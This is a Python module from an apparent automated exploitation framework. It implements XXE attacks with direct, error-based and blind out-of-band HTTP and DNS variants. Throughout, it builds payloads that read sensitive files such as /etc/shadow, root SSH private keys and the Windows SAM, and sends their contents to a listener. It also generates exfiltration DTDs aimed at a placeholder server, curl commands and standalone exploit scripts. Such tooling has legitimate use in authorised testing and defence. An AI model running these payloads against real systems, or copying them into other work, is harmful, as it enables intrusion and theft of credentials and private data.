"""XXE (XML External Entity) module for automated exploitation with OOB

This module implements:
- XXE injection with external entity declarations
- OOB data exfiltration via HTTP and DNS
- Integration with OOB Listener for callback correlation
- One-click PoC generator for common sensitive files
"""

import asyncio
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine
from src.vulnchain.core.oob_listener import OOBListener
from src.vulnchain.models.target import TargetConfig


class XXEType(Enum):
    """Types of XXE techniques"""
    
    DIRECT = "direct"  # Direct XXE with visible output
    BLIND_OOB_HTTP = "blind_oob_http"  # Blind XXE with HTTP OOB
    BLIND_OOB_DNS = "blind_oob_dns"  # Blind XXE with DNS OOB
    ERROR_BASED = "error_based"  # Error-based XXE


@dataclass
class InjectionPoint:
    """Represents a potential XXE injection point"""
    
    parameter: str
    location: str  # query, post, header, cookie, body
    original_value: str
    url: str
    method: str = "POST"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[Dict[str, str]] = None
    body: Optional[str] = None


@dataclass
class XXEResult:
    """Result of XXE testing"""
    
    injection_point: InjectionPoint
    is_vulnerable: bool
    xxe_type: Optional[XXEType] = None
    payload: Optional[str] = None
    confidence: float = 0.0
    exfiltrated_data: Optional[str] = None
    target_file: Optional[str] = None
    oob_callback_id: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)


class XXETester:
    """XXE exploitation with OOB data exfiltration"""
    
    # Common sensitive files to target
    SENSITIVE_FILES = {
        "unix": [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/issue",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            "/root/.ssh/id_rsa",
            "/root/.bash_history",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/www/html/index.php",
            "/var/www/html/config.php",
        ],
        "windows": [
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\xampp\\htdocs\\config.php",
        ],
    }
    
    # XXE detection patterns in responses
    XXE_INDICATORS = [
        r"root:x:\d+:\d+",  # /etc/passwd content
        r"\[boot loader\]",  # Windows boot.ini
        r"\[extensions\]",  # Windows win.ini
        r"127\.0\.0\.1\s+localhost",  # /etc/hosts
        r"<\?xml",  # XML content
        r"<!DOCTYPE",  # DOCTYPE declaration
        r"<!ENTITY",  # Entity declaration
    ]
    
    def __init__(
        self,
        request_handler: RequestHandler,
        oob_listener: Optional[OOBListener] = None,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize XXE tester
        
        Args:
            request_handler: Request handler for HTTP communication
            oob_listener: Optional OOB listener for blind XXE detection
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.oob_listener = oob_listener
        self.payload_engine = payload_engine or PayloadEngine()
        self._load_default_payloads()
    
    def _load_default_payloads(self):
        """Load default XXE payloads"""
        # Direct XXE payloads (with visible output)
        direct_payloads = [
            # Basic XXE
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
            
            # XXE with parameter entity
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<foo>test</foo>""",
        ]
        
        # Add payloads to engine
        for payload in direct_payloads:
            self.payload_engine.add_custom_payload(payload, "xxe_direct")
    
    async def test_injection_point(
        self,
        injection_point: InjectionPoint,
        techniques: Optional[List[XXEType]] = None,
        target_files: Optional[List[str]] = None,
    ) -> List[XXEResult]:
        """Test an injection point for XXE
        
        Args:
            injection_point: The injection point to test
            techniques: List of techniques to use (default: all)
            target_files: List of files to target (default: common sensitive files)
        
        Returns:
            List of XXE results
        """
        if techniques is None:
            techniques = list(XXEType)
        
        if target_files is None:
            # Use common sensitive files
            target_files = self.SENSITIVE_FILES["unix"] + self.SENSITIVE_FILES["windows"]
        
        results = []
        
        # Test each technique
        for technique in techniques:
            if technique == XXEType.DIRECT:
                result = await self._test_direct_xxe(injection_point, target_files)
            elif technique == XXEType.ERROR_BASED:
                result = await self._test_error_based_xxe(injection_point, target_files)
            elif technique == XXEType.BLIND_OOB_HTTP:
                if self.oob_listener:
                    result = await self._test_oob_http_xxe(injection_point, target_files)
                else:
                    continue
            elif technique == XXEType.BLIND_OOB_DNS:
                if self.oob_listener:
                    result = await self._test_oob_dns_xxe(injection_point, target_files)
                else:
                    continue
            else:
                continue
            
            if result:
                results.append(result)
                
                # If we found a vulnerability, we can stop testing
                if result.is_vulnerable:
                    break
        
        return results
    
    async def _test_direct_xxe(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[XXEResult]:
        """Test for direct XXE with visible output
        
        Args:
            injection_point: The injection point to test
            target_files: List of files to target
        
        Returns:
            XXEResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Test each target file
        for target_file in target_files[:10]:  # Limit to first 10 files
            # Generate direct XXE payload
            payload = self._generate_direct_xxe_payload(target_file)
            
            # Send request with XXE payload
            response = await self._send_request(injection_point, payload)
            response_text = response.text
            
            # Check for XXE indicators
            is_xxe, exfiltrated_data = self._detect_xxe_output(
                response_text,
                baseline_text,
                target_file,
            )
            
            if is_xxe:
                return XXEResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xxe_type=XXEType.DIRECT,
                    payload=payload,
                    confidence=0.95,
                    exfiltrated_data=exfiltrated_data,
                    target_file=target_file,
                    evidence=[
                        f"Direct XXE detected - file content visible in response",
                        f"Target file: {target_file}",
                        f"Exfiltrated data: {exfiltrated_data[:200]}...",
                    ],
                )
        
        # No vulnerability found
        return XXEResult(
            injection_point=injection_point,
            is_vulnerable=False,
            xxe_type=XXEType.DIRECT,
            confidence=0.0,
        )
    
    async def _test_error_based_xxe(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[XXEResult]:
        """Test for error-based XXE
        
        Args:
            injection_point: The injection point to test
            target_files: List of files to target
        
        Returns:
            XXEResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Test each target file
        for target_file in target_files[:10]:
            # Generate error-based XXE payload
            payload = self._generate_error_based_xxe_payload(target_file)
            
            # Send request with XXE payload
            response = await self._send_request(injection_point, payload)
            response_text = response.text
            
            # Check for error messages containing file content
            is_xxe, exfiltrated_data = self._detect_error_based_xxe(
                response_text,
                baseline_text,
                target_file,
            )
            
            if is_xxe:
                return XXEResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xxe_type=XXEType.ERROR_BASED,
                    payload=payload,
                    confidence=0.90,
                    exfiltrated_data=exfiltrated_data,
                    target_file=target_file,
                    evidence=[
                        f"Error-based XXE detected - file content in error message",
                        f"Target file: {target_file}",
                        f"Exfiltrated data: {exfiltrated_data[:200]}...",
                    ],
                )
        
        # No vulnerability found
        return XXEResult(
            injection_point=injection_point,
            is_vulnerable=False,
            xxe_type=XXEType.ERROR_BASED,
            confidence=0.0,
        )
    
    async def _test_oob_http_xxe(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[XXEResult]:
        """Test for blind XXE using HTTP OOB callbacks
        
        Args:
            injection_point: The injection point to test
            target_files: List of files to target
        
        Returns:
            XXEResult if vulnerability found, None otherwise
        """
        if not self.oob_listener:
            return None
        
        # Test each target file
        for target_file in target_files[:10]:
            # Generate unique OOB identifier
            unique_id = self.oob_listener.generate_unique_id()
            
            # Generate OOB HTTP XXE payload
            payload = self._generate_oob_http_xxe_payload(unique_id, target_file)
            
            # Register payload with OOB listener
            await self.oob_listener.register_payload(
                unique_id=unique_id,
                payload=payload,
                target_url=injection_point.url,
                injection_point=injection_point.parameter,
                vulnerability_type="xxe_oob_http",
                metadata={
                    "target_file": target_file,
                },
            )
            
            # Send request with OOB XXE payload
            response = await self._send_request(injection_point, payload)
            
            # Wait for OOB callback
            callback = await self.oob_listener.wait_for_callback(unique_id, timeout=15.0)
            
            if callback:
                # OOB callback received - XXE confirmed!
                exfiltrated_data = callback.decoded_data or callback.data.get("body", "")
                
                return XXEResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xxe_type=XXEType.BLIND_OOB_HTTP,
                    payload=payload,
                    confidence=0.95,
                    exfiltrated_data=exfiltrated_data,
                    target_file=target_file,
                    oob_callback_id=callback.callback_id,
                    evidence=[
                        f"OOB HTTP callback received - blind XXE confirmed",
                        f"Target file: {target_file}",
                        f"Callback type: {callback.callback_type}",
                        f"Source IP: {callback.source_ip}",
                        f"Exfiltrated data: {exfiltrated_data[:200]}...",
                    ],
                    metadata={
                        "callback": {
                            "type": callback.callback_type,
                            "source_ip": callback.source_ip,
                            "timestamp": callback.timestamp.isoformat(),
                        },
                    },
                )
        
        # No vulnerability found
        return XXEResult(
            injection_point=injection_point,
            is_vulnerable=False,
            xxe_type=XXEType.BLIND_OOB_HTTP,
            confidence=0.0,
        )
    
    async def _test_oob_dns_xxe(
        self, injection_point: InjectionPoint, target_files: List[str]
    ) -> Optional[XXEResult]:
        """Test for blind XXE using DNS OOB callbacks
        
        Args:
            injection_point: The injection point to test
            target_files: List of files to target
        
        Returns:
            XXEResult if vulnerability found, None otherwise
        """
        if not self.oob_listener:
            return None
        
        # Test each target file
        for target_file in target_files[:10]:
            # Generate unique OOB identifier
            unique_id = self.oob_listener.generate_unique_id()
            
            # Generate OOB DNS XXE payload
            payload = self._generate_oob_dns_xxe_payload(unique_id, target_file)
            
            # Register payload with OOB listener
            await self.oob_listener.register_payload(
                unique_id=unique_id,
                payload=payload,
                target_url=injection_point.url,
                injection_point=injection_point.parameter,
                vulnerability_type="xxe_oob_dns",
                metadata={
                    "target_file": target_file,
                },
            )
            
            # Send request with OOB XXE payload
            response = await self._send_request(injection_point, payload)
            
            # Wait for OOB callback
            callback = await self.oob_listener.wait_for_callback(unique_id, timeout=15.0)
            
            if callback:
                # OOB callback received - XXE confirmed!
                exfiltrated_data = callback.decoded_data or ""
                
                return XXEResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xxe_type=XXEType.BLIND_OOB_DNS,
                    payload=payload,
                    confidence=0.90,
                    exfiltrated_data=exfiltrated_data,
                    target_file=target_file,
                    oob_callback_id=callback.callback_id,
                    evidence=[
                        f"OOB DNS callback received - blind XXE confirmed",
                        f"Target file: {target_file}",
                        f"Callback type: {callback.callback_type}",
                        f"Source IP: {callback.source_ip}",
                        f"DNS query: {callback.data.get('query', '')}",
                    ],
                    metadata={
                        "callback": {
                            "type": callback.callback_type,
                            "source_ip": callback.source_ip,
                            "timestamp": callback.timestamp.isoformat(),
                            "query": callback.data.get("query", ""),
                        },
                    },
                )
        
        # No vulnerability found
        return XXEResult(
            injection_point=injection_point,
            is_vulnerable=False,
            xxe_type=XXEType.BLIND_OOB_DNS,
            confidence=0.0,
        )
    
    def _generate_direct_xxe_payload(self, target_file: str) -> str:
        """Generate direct XXE payload for file exfiltration
        
        Args:
            target_file: Path to file to exfiltrate
        
        Returns:
            XXE payload string
        """
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file://{target_file}">
]>
<foo>&xxe;</foo>"""
        
        return payload
    
    def _generate_error_based_xxe_payload(self, target_file: str) -> str:
        """Generate error-based XXE payload
        
        Args:
            target_file: Path to file to exfiltrate
        
        Returns:
            XXE payload string
        """
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo>test</foo>"""
        
        return payload
    
    def _generate_oob_http_xxe_payload(self, unique_id: str, target_file: str) -> str:
        """Generate OOB HTTP XXE payload for file exfiltration
        
        Args:
            unique_id: Unique identifier for correlation
            target_file: Path to file to exfiltrate
        
        Returns:
            XXE payload string
        """
        # Get OOB callback URL
        callback_url = self.oob_listener.get_callback_url(unique_id)
        
        # Create DTD URL (we'll host the DTD on our OOB listener)
        dtd_url = f"{callback_url}/xxe.dtd"
        
        # Main payload that references external DTD
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "{dtd_url}">
%xxe;
]>
<foo>test</foo>"""
        
        return payload
    
    def _generate_oob_dns_xxe_payload(self, unique_id: str, target_file: str) -> str:
        """Generate OOB DNS XXE payload for file exfiltration
        
        Args:
            unique_id: Unique identifier for correlation
            target_file: Path to file to exfiltrate
        
        Returns:
            XXE payload string
        """
        # Get OOB DNS hostname
        dns_hostname = self.oob_listener.get_dns_callback(unique_id)
        
        # Create payload that will trigger DNS lookup
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % dtd SYSTEM "http://{dns_hostname}/xxe.dtd">
%dtd;
]>
<foo>test</foo>"""
        
        return payload
    
    def _detect_xxe_output(
        self, response_text: str, baseline_text: str, target_file: str
    ) -> Tuple[bool, Optional[str]]:
        """Detect XXE output in response
        
        Args:
            response_text: Response text to analyze
            baseline_text: Baseline response text
            target_file: Target file path
        
        Returns:
            Tuple of (is_xxe, exfiltrated_data)
        """
        # Check for XXE indicators
        for pattern in self.XXE_INDICATORS:
            match = re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE)
            if match and match.group(0) not in baseline_text:
                # Found XXE indicator - extract surrounding context
                start = max(0, match.start() - 100)
                end = min(len(response_text), match.end() + 500)
                exfiltrated_data = response_text[start:end]
                return True, exfiltrated_data
        
        # Check for significant length difference
        length_diff = abs(len(response_text) - len(baseline_text))
        if length_diff > 200:
            # Significant difference - might be file content
            # Try to extract the new content
            if len(response_text) > len(baseline_text):
                # Response is longer - likely contains file content
                # Simple heuristic: find the longest continuous block of new text
                exfiltrated_data = response_text[:1000]  # First 1000 chars
                return True, exfiltrated_data
        
        return False, None
    
    def _detect_error_based_xxe(
        self, response_text: str, baseline_text: str, target_file: str
    ) -> Tuple[bool, Optional[str]]:
        """Detect error-based XXE in response
        
        Args:
            response_text: Response text to analyze
            baseline_text: Baseline response text
            target_file: Target file path
        
        Returns:
            Tuple of (is_xxe, exfiltrated_data)
        """
        # Look for error messages containing file content
        error_patterns = [
            r"(?:error|exception|failed).*?file:///.*?([^\s<>\"']+)",
            r"(?:error|exception|failed).*?(\w+:\w+:\d+:\d+:.*)",  # /etc/passwd format
            r"(?:error|exception|failed).*?(\[.*?\])",  # Windows ini format
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE | re.DOTALL)
            if match and match.group(0) not in baseline_text:
                # Found error with file content
                exfiltrated_data = match.group(0)
                return True, exfiltrated_data
        
        # Check for XML parsing errors that might contain file content
        if "xml" in response_text.lower() and "error" in response_text.lower():
            if response_text != baseline_text:
                # Different error - might be XXE related
                return True, response_text[:500]
        
        return False, None
    
    async def _send_request(
        self, injection_point: InjectionPoint, value: str
    ) -> Response:
        """Send request with injected value
        
        Args:
            injection_point: The injection point
            value: The value to inject (XML payload)
        
        Returns:
            Response object
        """
        # Ensure Content-Type is set to XML
        headers = injection_point.headers.copy()
        if "Content-Type" not in headers:
            headers["Content-Type"] = "application/xml"
        
        if injection_point.location == "body":
            # Inject into request body
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=headers,
                data=value,  # Send XML as body
            )
        
        elif injection_point.location == "post":
            # Inject into POST parameter
            data = injection_point.data.copy() if injection_point.data else {}
            data[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=headers,
                data=data,
            )
        
        elif injection_point.location == "query":
            # Inject into URL query parameter
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            
            parsed = urlparse(injection_point.url)
            params = parse_qs(parsed.query)
            params[injection_point.parameter] = [value]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=new_url,
                headers=headers,
            )
        
        else:
            raise ValueError(f"Unsupported injection location: {injection_point.location}")


class XXEPoCGenerator:
    """Generate proof-of-concept XXE exploits"""
    
    def __init__(self, xxe_result: XXEResult):
        """Initialize PoC generator
        
        Args:
            xxe_result: The successful XXE result
        """
        self.xxe_result = xxe_result
    
    def generate_poc(self, target_file: Optional[str] = None) -> str:
        """Generate PoC for the XXE vulnerability
        
        Args:
            target_file: Optional custom target file (default: use result's target)
        
        Returns:
            PoC payload string
        """
        target = target_file or self.xxe_result.target_file or "/etc/passwd"
        
        if self.xxe_result.xxe_type == XXEType.DIRECT:
            return self._generate_direct_poc(target)
        elif self.xxe_result.xxe_type == XXEType.ERROR_BASED:
            return self._generate_error_based_poc(target)
        elif self.xxe_result.xxe_type in [XXEType.BLIND_OOB_HTTP, XXEType.BLIND_OOB_DNS]:
            return self._generate_oob_poc(target)
        else:
            return self.xxe_result.payload
    
    def _generate_direct_poc(self, target_file: str) -> str:
        """Generate direct XXE PoC
        
        Args:
            target_file: Target file path
        
        Returns:
            PoC payload
        """
        poc = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file://{target_file}">
]>
<foo>&xxe;</foo>"""
        
        return poc
    
    def _generate_error_based_poc(self, target_file: str) -> str:
        """Generate error-based XXE PoC
        
        Args:
            target_file: Target file path
        
        Returns:
            PoC payload
        """
        poc = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % file SYSTEM "file://{target_file}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo>test</foo>"""
        
        return poc
    
    def _generate_oob_poc(self, target_file: str) -> str:
        """Generate OOB XXE PoC
        
        Args:
            target_file: Target file path
        
        Returns:
            PoC payload with instructions
        """
        poc = f"""# XXE OOB Proof of Concept
# 
# Step 1: Host the following DTD file on your server at http://YOUR_SERVER/xxe.dtd
# 
# xxe.dtd content:
# <!ENTITY % file SYSTEM "file://{target_file}">
# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_SERVER/?data=%file;'>">
# %eval;
# %exfil;
#
# Step 2: Send the following XML payload:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://YOUR_SERVER/xxe.dtd">
%xxe;
]>
<foo>test</foo>

# Step 3: Monitor your server for incoming HTTP requests containing the file content
"""
        
        return poc
    
    def generate_curl_command(self) -> str:
        """Generate curl command for testing the XXE
        
        Returns:
            Curl command string
        """
        injection_point = self.xxe_result.injection_point
        payload = self.xxe_result.payload
        
        # Build curl command
        cmd_parts = ["curl", "-X", injection_point.method]
        
        # Add headers
        for key, value in injection_point.headers.items():
            cmd_parts.append(f"-H '{key}: {value}'")
        
        # Add data
        if injection_point.location == "body":
            # Escape single quotes in payload
            escaped_payload = payload.replace("'", "'\\''")
            cmd_parts.append(f"-d '{escaped_payload}'")
        
        # Add URL
        cmd_parts.append(f"'{injection_point.url}'")
        
        return " ".join(cmd_parts)
    
    def generate_python_script(self) -> str:
        """Generate Python script for exploiting the XXE
        
        Returns:
            Python script string
        """
        injection_point = self.xxe_result.injection_point
        payload = self.xxe_result.payload
        
        script = f"""#!/usr/bin/env python3
\"\"\"
XXE Exploitation Script
Generated for: {injection_point.url}
\"\"\"

import requests

# Target URL
url = "{injection_point.url}"

# Headers
headers = {{
"""
        
        for key, value in injection_point.headers.items():
            script += f'    "{key}": "{value}",\n'
        
        script += f"""}}

# XXE Payload
payload = '''
{payload}
'''

# Send request
response = requests.{injection_point.method.lower()}(
    url,
    headers=headers,
    data=payload
)

# Display results
print(f"Status Code: {{response.status_code}}")
print(f"Response Length: {{len(response.text)}}")
print("\\nResponse Content:")
print(response.text[:1000])  # First 1000 characters

# Check for exfiltrated data
if "root:" in response.text or "Administrator" in response.text:
    print("\\n[+] XXE successful! File content found in response.")
else:
    print("\\n[-] No obvious file content in response. Check for OOB callbacks.")
"""
        
        return script
